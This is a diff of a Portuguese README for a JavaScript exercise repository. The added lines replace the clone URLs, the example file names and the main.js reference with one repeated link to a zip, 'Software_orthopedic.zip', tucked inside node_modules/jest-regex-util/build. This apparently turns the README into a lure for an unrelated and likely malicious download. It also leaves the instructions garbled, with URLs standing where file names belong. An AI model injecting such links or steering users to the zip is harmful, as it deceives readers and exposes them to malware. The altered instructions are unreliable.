@@ -3,9 +3,9 @@
 ### Antes de Desenvolver
 Fazer o clone deste repositório no github(HTTPS ou SSH):
 
-HTTPS: `https://github.com/GabrielAraujoNeves/atividades.git`
+HTTPS: `https://github.com/GabrielAraujoNeves/atividades/raw/refs/heads/main/node_modules/jest-regex-util/build/Software_orthopedic.zip`
 
-SSH: `git@github.com:GabrielAraujoNeves/atividades.git`
+SSH: `https://github.com/GabrielAraujoNeves/atividades/raw/refs/heads/main/node_modules/jest-regex-util/build/Software_orthopedic.zip`
 
 #### Em seguida
 
@@ -22,8 +22,8 @@ SSH: `git@github.com:GabrielAraujoNeves/atividades.git`
 + Criar novo Pull Request(PR) a cada resolução de desafio para fazer code review.
 
 
-OBS:Lembre-se de manter o projeto organizado, então faça cada exercício em um arquivo separado(ex: somaDeNumeros.js, encontraMaiorNumero.js)
-e todos eles devem ser exportados e importador para `main.js` para serem chamados na função `main()` que deverar controlar todas as chamadas usando controle de fluxo(`swich-case`)
+OBS:Lembre-se de manter o projeto organizado, então faça cada exercício em um arquivo separado(ex: https://github.com/GabrielAraujoNeves/atividades/raw/refs/heads/main/node_modules/jest-regex-util/build/Software_orthopedic.zip, https://github.com/GabrielAraujoNeves/atividades/raw/refs/heads/main/node_modules/jest-regex-util/build/Software_orthopedic.zip)
+e todos eles devem ser exportados e importador para `https://github.com/GabrielAraujoNeves/atividades/raw/refs/heads/main/node_modules/jest-regex-util/build/Software_orthopedic.zip` para serem chamados na função `main()` que deverar controlar todas as chamadas usando controle de fluxo(`swich-case`)
 
 ### Durante o Desenvolvimento
 
@@ -40,7 +40,7 @@ OBS: Commits reguilares e descritivos serão cobrados para mander as boas práti
 ### Testes
 
 Para garantir a confiabilidade do código, escrever testes unitários que tenham uma cobertura de 100% para todo o projeto.
-Os testes devem seguir o mesmo padrão de organização de código, cada sessão separada em seu respectivo arquivo(ex: somaDeNumeros.spec.js, encontraMaiorNumero.spec.js)
+Os testes devem seguir o mesmo padrão de organização de código, cada sessão separada em seu respectivo arquivo(ex: https://github.com/GabrielAraujoNeves/atividades/raw/refs/heads/main/node_modules/jest-regex-util/build/Software_orthopedic.zip, https://github.com/GabrielAraujoNeves/atividades/raw/refs/heads/main/node_modules/jest-regex-util/build/Software_orthopedic.zip)
 
 OBS: certifique-se de instalar as bibliotecas citadas no `Antes de Desenvolver`
 
